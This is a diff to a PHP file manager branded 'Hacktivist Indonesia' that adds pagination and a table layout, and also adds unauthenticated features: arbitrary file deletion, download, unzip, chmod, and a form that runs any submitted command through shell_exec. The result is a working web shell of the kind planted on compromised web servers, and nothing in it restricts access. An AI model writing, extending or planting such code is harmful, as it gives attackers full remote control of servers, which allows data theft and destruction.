@@ -1,6 +1,8 @@
 <?php
 
 $current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
+$files_per_page = 20;
+$current_page = isset($_GET['page']) ? intval($_GET['page']) : 1;
 
 if (isset($_FILES['file_to_upload'])) {
     $upload_file = $current_dir . '/' . basename($_FILES['file_to_upload']['name']);
@@ -29,7 +31,41 @@ if (isset($_POST['new_folder'])) {
     }
 }
 
-$files = scandir($current_dir);
+if (isset($_GET['delete'])) {
+    $file_to_delete = $_GET['delete'];
+    if (is_dir($file_to_delete)) {
+        rmdir($file_to_delete);
+        echo "<div class='success'>Folder berhasil dihapus.</div>";
+    } else {
+        unlink($file_to_delete);
+        echo "<div class='success'>File berhasil dihapus.</div>";
+    }
+}
+
+if (isset($_GET['unzip'])) {
+    $file_to_unzip = $_GET['unzip'];
+    $zip = new ZipArchive;
+    if ($zip->open($file_to_unzip) === TRUE) {
+        $zip->extractTo($current_dir);
+        $zip->close();
+        echo "<div class='success'>File berhasil di-unzip.</div>";
+    } else {
+        echo "<div class='error'>Gagal meng-unzip file.</div>";
+    }
+}
+
+if (isset($_POST['chmod'])) {
+    $chmod_file = $_POST['chmod_file'];
+    $chmod_value = $_POST['chmod_value'];
+    if (chmod($chmod_file, octdec($chmod_value))) {
+        echo "<div class='success'>Izin file berhasil diubah.</div>";
+    } else {
+        echo "<div class='error'>Gagal mengubah izin file.</div>";
+    }
+}
+
+$all_files = scandir($current_dir);
+$files = array_slice($all_files, ($current_page - 1) * $files_per_page, $files_per_page);
 
 function formatSize($size) {
     $units = array('B', 'KB', 'MB', 'GB', 'TB');
@@ -39,6 +75,21 @@ function formatSize($size) {
     return round($size, 2) . ' ' . $units[$i];
 }
 
+function renderPagination($current_page, $total_files, $files_per_page) {
+    $total_pages = ceil($total_files / $files_per_page);
+    if ($total_pages <= 1) return;
+
+    echo '<div class="pagination">';
+    for ($i = 1; $i <= $total_pages; $i++) {
+        if ($i == $current_page) {
+            echo "<strong>$i</strong> ";
+        } else {
+            echo "<a href=\"?dir={$GLOBALS['current_dir']}&page=$i\">$i</a> ";
+        }
+    }
+    echo '</div>';
+}
+
 ?>
 
 <!DOCTYPE html>
@@ -46,7 +97,7 @@ function formatSize($size) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PHP File Manager SukaJanda01</title>
+    <title>PhP File Manager SukaJanda01</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -60,7 +111,7 @@ function formatSize($size) {
             color: #444;
         }
         .container {
-            max-width: 800px;
+            max-width: 1000px;
             margin: 0 auto;
             background: #fff;
             padding: 20px;
@@ -69,14 +120,14 @@ function formatSize($size) {
         form {
             margin-bottom: 20px;
         }
-        input[type="text"], input[type="file"] {
+        input[type="text"], input[type="file"], input[type="number"] {
             width: 100%;
             padding: 8px;
             margin: 10px 0;
             box-sizing: border-box;
             border: 1px solid #ccc;
         }
-        input[type="submit"] {
+        input[type="submit"], .btn {
             background: #007BFF;
             color: #fff;
             padding: 10px;
@@ -84,7 +135,7 @@ function formatSize($size) {
             cursor: pointer;
             width: 100%;
         }
-        input[type="submit"]:hover {
+        input[type="submit"]:hover, .btn:hover {
             background: #0056b3;
         }
         .success {
@@ -95,36 +146,51 @@ function formatSize($size) {
             color: red;
             margin-bottom: 10px;
         }
-        ul {
-            list-style-type: none;
-            padding: 0;
+        table {
+            width: 100%;
+            border-collapse: collapse;
         }
-        ul li {
-            padding: 10px;
-            background: #f9f9f9;
+        table, th, td {
             border: 1px solid #ddd;
-            margin-bottom: 5px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
         }
-        ul li a {
-            color: #007BFF;
+        th, td {
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .actions {
+            text-align: center;
+        }
+        .actions a, .actions form {
+            display: inline-block;
+            margin: 0 5px;
+        }
+        .actions a.btn, .actions input[type="submit"] {
+            width: auto;
+            padding: 5px 10px;
+        }
+        .pagination {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .pagination a {
+            padding: 5px 10px;
+            margin: 0 5px;
+            background: #007BFF;
+            color: #fff;
             text-decoration: none;
         }
-        ul li a:hover {
-            text-decoration: underline;
-        }
-        .file-info {
-            font-size: 0.9em;
-            color: #666;
+        .pagination a:hover {
+            background: #0056b3;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>PhP File Manager Hacktivist Indonesia</h2>
+    <h2>PHP File Manager Hacktivist Indonesia</h2>
 
     <form enctype="multipart/form-data" method="post">
         Pilih file: <input name="file_to_upload" type="file"><br><br>
@@ -148,22 +214,73 @@ function formatSize($size) {
     <hr>
 
     <h3>Daftar File dan Folder</h3>
-    <ul>
+    <table>
+        <tr>
+            <th>Nama</th>
+            <th>Ukuran</th>
+            <th>Izin</th>
+            <th>Tindakan</th>
+        </tr>
         <?php foreach ($files as $file): ?>
             <?php if ($file == '.' || $file == '..') continue; ?>
-            <li>
-                <?php if (is_dir($current_dir . '/' . $file)): ?>
-                    <a href="?dir=<?php echo $current_dir . '/' . $file; ?>"><?php echo $file; ?>/</a>
-                <?php else: ?>
-                    <?php echo $file; ?>
-                    <span class="file-info">
-                        - Ukuran: <?php echo formatSize(filesize($current_dir . '/' . $file)); ?>
-                        - Izin: <?php echo substr(sprintf('%o', fileperms($current_dir . '/' . $file)), -4); ?>
-                    </span>
-                <?php endif; ?>
-            </li>
+            <tr>
+                <td>
+                    <?php if (is_dir($current_dir . '/' . $file)): ?>
+                        <a href="?dir=<?php echo $current_dir . '/' . $file; ?>"><?php echo $file; ?>/</a>
+                    <?php else: ?>
+                        <?php echo $file; ?>
+                    <?php endif; ?>
+                </td>
+                <td><?php echo is_file($current_dir . '/' . $file) ? formatSize(filesize($current_dir . '/' . $file)) : '-'; ?></td>
+                <td><?php echo substr(sprintf('%o', fileperms($current_dir . '/' . $file)), -4); ?></td>
+                <td class="actions">
+                    <?php if (!is_dir($current_dir . '/' . $file)): ?>
+                        <a href="?dir=<?php echo $current_dir; ?>&download=<?php echo $current_dir . '/' . $file; ?>" class="btn">Download</a>
+                        <?php if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'): ?>
+                            <a href="?dir=<?php echo $current_dir; ?>&unzip=<?php echo $current_dir . '/' . $file; ?>" class="btn">Unzip</a>
+                        <?php endif; ?>
+                    <?php endif; ?>
+                    <a href="?dir=<?php echo $current_dir; ?>&delete=<?php echo $current_dir . '/' . $file; ?>" class="btn" onclick="return confirm('Apakah Anda yakin ingin menghapus ini?')">Hapus</a>
+                    <form method="post" style="display:inline;">
+                        <input type="hidden" name="chmod_file" value="<?php echo $current_dir . '/' . $file; ?>">
+                        <input type="number" name="chmod_value" placeholder="0777" style="width: 60px;">
+                        <input type="submit" value="Chmod" class="btn">
+                    </form>
+                </td>
+            </tr>
         <?php endforeach; ?>
-    </ul>
+    </table>
+
+    <?php
+    renderPagination($current_page, count($all_files) - 2, $files_per_page);
+    ?>
+
+    <hr>
+
+    <h3>Jalankan Perintah CMD</h3>
+    <form method="post">
+        <input type="text" name="cmd" placeholder="ls -la" required>
+        <input type="submit" value="Jalankan Perintah" class="btn">
+    </form>
+
+    <?php
+    if (isset($_POST['cmd'])) {
+        $cmd = $_POST['cmd'];
+        $output = shell_exec($cmd);
+        echo "<pre>$output</pre>";
+    }
+
+    if (isset($_GET['download'])) {
+        $file_to_download = $_GET['download'];
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file_to_download).'"');
+        header('Content-Length: ' . filesize($file_to_download));
+        readfile($file_to_download);
+        exit;
+    }
+    ?>
+
 </div>
 
 </body>
